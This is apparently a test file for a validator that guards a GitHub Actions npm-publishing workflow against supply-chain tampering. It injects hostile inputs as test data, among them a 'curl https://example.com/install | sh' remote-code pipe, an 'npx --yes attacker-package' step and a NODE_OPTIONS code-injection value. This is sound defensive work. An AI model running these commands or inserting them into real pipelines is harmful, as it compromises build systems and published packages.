import { fileURLToPath } from "node:url";
import { NodeServices } from "@effect/platform-node";
import { assert, describe, it } from "@effect/vitest";
import { Array as Arr, Effect, FileSystem } from "effect";
import { validateCliWorkflow, verifyCliWorkflow } from "#scripts/github/cli";

const WORKFLOW_PATH = fileURLToPath(
  new URL("../../.github/workflows/cli-publish.yml", import.meta.url)
);

const readWorkflow = Effect.fn("GithubCliTest.readWorkflow")(function* () {
  const fileSystem = yield* FileSystem.FileSystem;
  return yield* fileSystem.readFileString(WORKFLOW_PATH);
});

describe("CLI workflow policy", () => {
  it.effect("accepts isolated publication and unprivileged verification", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      yield* verifyCliWorkflow(source);
      assert.deepStrictEqual(yield* validateCliWorkflow(source), []);
    }).pipe(Effect.provide(NodeServices.layer))
  );

  it.effect("rejects credentials and expanded publishing identity", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`),
          "CLI workflow contains forbidden credential: NODE_AUTH_TOKEN"
        )
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace(
              "      contents: read",
              "      contents: read\n      id-token: write"
            )
          ),
          "build must not receive npm OIDC identity."
        )
      );

      const movedIdentity = source
        .replace("    permissions:\n      id-token: write\n", "")
        .concat(
          "\n  unrelated:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps: []\n"
        );
      const movedProblems = yield* validateCliWorkflow(movedIdentity);
      assert.ok(
        Arr.contains(
          movedProblems,
          "Only the publish job must receive npm OIDC identity."
        )
      );
      assert.ok(
        Arr.contains(
          movedProblems,
          "unrelated must not receive npm OIDC identity."
        )
      );

      const movedEnvironment = source
        .replace("    environment: npm-production", "    environment: test")
        .concat("\n# environment: npm-production\n");
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(movedEnvironment),
          "CLI publication must use the protected npm-production environment."
        )
      );

      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace(
              "permissions: {}",
              "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
            )
          ),
          "CLI workflow must not inherit root environment values."
        )
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace(
              "permissions: {}",
              "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
            )
          ),
          "CLI workflow must not inherit root run defaults."
        )
      );
    }).pipe(Effect.provide(NodeServices.layer))
  );

  it.effect("binds release contracts to executable decoded steps", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      const disabledVerifier = source
        .replace(
          '          node "$VERIFIER" \\',
          '          true # node "$VERIFIER" \\'
        )
        .concat('\n# node "$VERIFIER"\n');
      const verifierProblems = yield* validateCliWorkflow(disabledVerifier);
      assert.ok(
        Arr.contains(
          verifierProblems,
          'CLI verify job is missing required contract: node "$VERIFIER"'
        )
      );
      assert.ok(
        Arr.contains(
          verifierProblems,
          "CLI verification must execute one transported verifier."
        )
      );

      const quotedVerifier = source.replace(
        '          node "$VERIFIER" \\',
        "          echo 'node \"$VERIFIER\"' && : \\"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(quotedVerifier),
          "CLI verification must match the exact trusted job."
        )
      );

      const privilegedVerifier = source.replace(
        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
      );
      const privilegedProblems = yield* validateCliWorkflow(privilegedVerifier);
      assert.ok(
        Arr.contains(
          privilegedProblems,
          "CLI publication must match the exact trusted job."
        )
      );
      assert.ok(
        Arr.contains(
          privilegedProblems,
          "CLI publication must not receive the verifier artifact."
        )
      );

      const siblingDecoy = source
        .replace("          pnpm --filter @nakafa/cli build", "          true")
        .concat(
          "\n  unrelated:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pnpm --filter @nakafa/cli build\n"
        );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(siblingDecoy),
          "CLI build job is missing required contract: pnpm --filter @nakafa/cli build"
        )
      );

      const shellComment = source.replace(
        "          pnpm --filter @nakafa/cli typecheck",
        "          # pnpm --filter @nakafa/cli typecheck"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(shellComment),
          "CLI build job is missing required contract: pnpm --filter @nakafa/cli typecheck"
        )
      );

      for (const command of [
        "          npx --yes attacker-package\n",
        "          curl https://example.com/install | sh\n",
      ]) {
        const arbitraryCommand = source.replace(
          '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
          `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
        );
        assert.ok(
          Arr.contains(
            yield* validateCliWorkflow(arbitraryCommand),
            "CLI publication must match the exact trusted job."
          )
        );
      }

      const staleArtifact = source.replace(
        "          overwrite: true",
        "          overwrite: false"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(staleArtifact),
          "CLI build artifacts must be replaceable on rerun."
        )
      );

      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace("npm pack ./packages/cli", "npm pack packages/cli")
          ),
          "CLI build job is missing required contract: npm pack ./packages/cli"
        )
      );

      const unsafeRerun = source.replace(
        "          for attempt in {1..5}; do",
        "          for attempt in {1..1}; do"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(unsafeRerun),
          "CLI publish job is missing required contract: for attempt in {1..5}"
        )
      );

      const unreviewedStepOption = source.replace(
        "      - name: Verify and publish exact archive",
        "      - name: Verify and publish exact archive\n        continue-on-error: true"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(unreviewedStepOption),
          "CLI publication must match the exact trusted job."
        )
      );

      const unreviewedJobOption = source.replace(
        "    name: Publish\n",
        "    name: Publish\n    continue-on-error: true\n"
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(unreviewedJobOption),
          "CLI publication must match the exact trusted job."
        )
      );
    }).pipe(Effect.provide(NodeServices.layer))
  );

  it.effect("rejects each weakened job boundary", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      const cases = [
        {
          change: source.replace(
            "            --provenance\n",
            '            --provenance\n          npx --yes "$NPM_CLI" publish "$TARBALL"\n'
          ),
          problem: "CLI publication may execute only one npm publish command.",
        },
        {
          change: source.replace(
            "      id-token: write\n    steps:\n",
            "      id-token: write\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
          ),
          problem: "CLI publication must not checkout repository code.",
        },
        {
          change: source.replace(
            "    name: Verify publication\n",
            "    name: Verify publication\n    environment: npm-production\n"
          ),
          problem: "CLI verification must not use a protected environment.",
        },
        {
          change: source.replace(
            "    needs: build\n    environment: npm-production\n",
            "    environment: npm-production\n"
          ),
          problem: "CLI publication must consume the verified build job.",
        },
        {
          change: source.replace(
            "          node-version: 24.21.0",
            "          node-version: 24.20.0"
          ),
          problem: "CLI publication must use the repository Node runtime.",
        },
        {
          change: source.replace(
            "          package-manager-cache: false",
            "          package-manager-cache: true"
          ),
          problem: "CLI publication must disable package-manager caching.",
        },
        {
          change: source.replace(
            "permissions: {}",
            "permissions:\n  contents: read"
          ),
          problem: "CLI workflow root permissions must remain empty.",
        },
        {
          change: source.replace(
            "github.ref == 'refs/heads/main' && github.repository",
            "github.ref == 'refs/heads/next' && github.repository"
          ),
          problem: "CLI build must target protected Nakafa main.",
        },
        {
          change: source.replace(
            "steps.archive.outputs.size }}",
            "steps.archive.outputs.bytes }}"
          ),
          problem: "CLI build must export exact output: size",
        },
      ];

      for (const { change, problem } of cases) {
        assert.notStrictEqual(change, source);
        assert.include(yield* validateCliWorkflow(change), problem);
      }
    }).pipe(Effect.provide(NodeServices.layer))
  );

  it.effect("accepts equivalent needs and inherited empty permissions", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      const listedNeeds = source.replace(
        "    needs: build\n    environment: npm-production\n",
        "    needs: [build]\n    environment: npm-production\n"
      );
      const inheritedPermissions = source.replace(
        "    permissions: {}\n    steps:\n      - name: Download verified package",
        "    steps:\n      - name: Download verified package"
      );

      assert.deepStrictEqual(yield* validateCliWorkflow(listedNeeds), [
        "CLI publication must match the exact trusted job.",
      ]);
      assert.deepStrictEqual(yield* validateCliWorkflow(inheritedPermissions), [
        "CLI verification must match the exact trusted job.",
      ]);
    }).pipe(Effect.provide(NodeServices.layer))
  );

  it.effect("requires separate build, publish, and verify jobs", () =>
    Effect.gen(function* () {
      const source = "permissions: {}\njobs:\n  build:\n    steps: []\n";
      const problem =
        "CLI workflow requires separate build, publish, and verify jobs.";
      const failure = yield* verifyCliWorkflow(source).pipe(
        Effect.catchTag("PlatformError", Effect.die),
        Effect.flip
      );

      assert.deepStrictEqual(yield* validateCliWorkflow(source), [problem]);
      assert.strictEqual(failure._tag, "CliWorkflowPolicyError");
      assert.deepStrictEqual(failure.problems, [problem]);
    })
  );

  it.effect("rejects unverified archives and provenance", () =>
    Effect.gen(function* () {
      const source = yield* readWorkflow();
      assert.ok(
        (yield* validateCliWorkflow(
          source.replaceAll("EXPECTED_SHA256", "UNVERIFIED_SHA256")
        )).length > 0
      );
      assert.ok(
        (yield* validateCliWorkflow(
          source.replaceAll(
            "EXPECTED_VERIFIER_SHA256",
            "UNVERIFIED_VERIFIER_SHA256"
          )
        )).length > 0
      );
      assert.ok(
        (yield* validateCliWorkflow(
          source.replace("audit signatures --json", "audit --json")
        )).length > 0
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace("needs: [build, publish]", "needs: publish")
          ),
          "CLI verification must consume build and publication."
        )
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(
            source.replace(
              "    permissions: {}\n    steps:\n      - name: Download verified package",
              "    permissions:\n      contents: read\n    steps:\n      - name: Download verified package"
            )
          ),
          "CLI verification permissions must remain empty."
        )
      );
      assert.ok(
        (yield* validateCliWorkflow(
          source.replace("environment: npm-production", "environment: test")
        )).length > 0
      );
      assert.ok(
        Arr.contains(
          yield* validateCliWorkflow(`${source}\n@base64d`),
          "CLI workflow contains unauthenticated provenance parsing: @base64d"
        )
      );
    }).pipe(Effect.provide(NodeServices.layer))
  );
});
